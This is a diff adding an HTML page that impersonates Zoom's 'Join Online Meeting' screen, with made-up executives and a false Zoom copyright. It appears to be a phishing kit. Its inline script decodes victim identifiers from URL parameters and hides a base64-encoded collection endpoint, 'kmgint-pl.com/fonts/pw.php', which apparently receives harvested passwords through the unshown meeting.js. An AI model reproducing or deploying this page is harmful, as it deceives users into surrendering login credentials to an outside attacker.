@@ -1,0 +1,136 @@
+
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/nav.css">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/link.css">
+    <link rel="stylesheet" href="./Zoom-Call-Group-Meeting_files/meeting.css">
+    <link rel="shortcut icon" href="./Zoom-Call-Group-Meeting_files/favicon2.ico" type="image/x-icon">
+    <script src="./Zoom-Call-Group-Meeting_files/jquery.3.7.0.js.download"></script>
+    <title>Zoom-Call-Group-Meeting</title>
+</head><body>
+    <main>
+        
+        <nav>
+        <div class="nav_top">
+        <span id="mobile_menu">☰</span>
+            <ul>
+                <li>
+                    <span>
+                    <span class="svg_container">
+                    <input type="search" name="" id="nav_iput" placeholder="Search">
+                    <img id="search_img" class="img_svg" src="./Zoom-Call-Group-Meeting_files/search.svg" alt="Search">
+                    </span>
+                    Search
+                    </span>
+
+                    <a href="#">support</a>
+                    <a href="#">1.888.799.9666</a>
+                    <a href="#"> Request a Demo</a>
+                </li>
+
+                <li>|</li>
+
+                <li>
+                <a href="#">Join</a>
+                <span id="host_container" class="svg_container">Host <img id="host_img" class="img_svg" src="./Zoom-Call-Group-Meeting_files/chevron-down.svg" alt="arrow down"></span>
+                <a href="#">Sign In</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="nav_down">
+            <ul>
+                <li>
+                    <span>
+                    <img id="zoom_img" src="./Zoom-Call-Group-Meeting_files/logo.svg" alt="Zoom">
+                    <a href="#">Products</a>
+                    <a href="#">Solutions</a>
+                    <a href="#">Resources</a>
+                    <a href="#">Plans &amp; Pricing</a>
+                    </span>
+
+                    <span>
+                        <a id="conact_btn" href="#">Contact Sales</a>
+                        <a id="sign_btn" href="#">Sign Up Free</a>
+                    </span>
+                </li>
+            </ul>
+        </div>
+        </nav>
+            
+    <section class="meeting_container">
+    <div class="meeting_contents">
+
+    <h1>Join Online Meeting</h1>
+
+    <div class="meeting_header">
+    Welcome, <b><span id="id"></span></b>. You have been invited to join a meeting.
+    </div>
+
+    <div class="meeting_online">
+    2 Users Online <span id="online_icon"></span>
+    </div>
+    
+    <div class="meeting_photo">
+        <section>
+        <img src="./Zoom-Call-Group-Meeting_files/ceo.jpeg" alt="CEO">
+        <p>
+        <span>Mr. Abd Al-Rahman Aydinn</span>
+        </p><h5>(C.E.O)</h5><h5>
+        <p></p>
+        </h5></section>
+
+        <section>
+        <img src="./Zoom-Call-Group-Meeting_files/manager.jpeg" alt="MANAGER">
+        <p>
+        <span>Mrs. Aldogan Cetin</span>
+        </p><h5>(Intl. Marketing Manager)</h5><h5>
+        <p></p>
+        </h5></section>
+    </div>
+
+    <div class="meeting_loading">
+      <span id="loader_img"></span>
+      <span id="loader_text"></span>
+    </div>
+
+    <input type="hidden" id="get_id" value=""> 
+    <input type="hidden" id="get_access" value="">
+	    <input type="hidden" id="get_url" value="">
+
+    <button id="join_btn">Join</button>
+
+    <div class="meeting_note">
+    If you are unable to join the meeting, <a href="#" onclick="window.location.reload(true);">click here to <b>Refresh</b></a>.
+    </div>
+
+    </div>
+
+    </section>
+
+    <footer>
+    Copyright ©2025 Zoom Video Communication, Inc. All Rights Reserved.
+    </footer>
+    
+        <script src="./Zoom-Call-Group-Meeting_files/link.js.download"></script>
+        <script src="./Zoom-Call-Group-Meeting_files/meeting.js.download"></script>
+        <script src="./Zoom-Call-Group-Meeting_files/nav.js.download"></script>
+            </main>
+
+<script>
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const id = atob(urlParams.get('id'));
+    const meeting = urlParams.get('meeting');
+	const access = atob(urlParams.get('access'));
+	const get_id = urlParams.get('id');
+	const get_access = urlParams.get('access');
+	document.getElementById("id").innerHTML = id;
+	document.getElementById("get_id").value = get_id;
+	document.getElementById("get_access").value = get_access;
+	document.getElementById("get_url").value = btoa("https://kmgint-pl.com/fonts/pw.php");
+</script>
+
+</body></html>
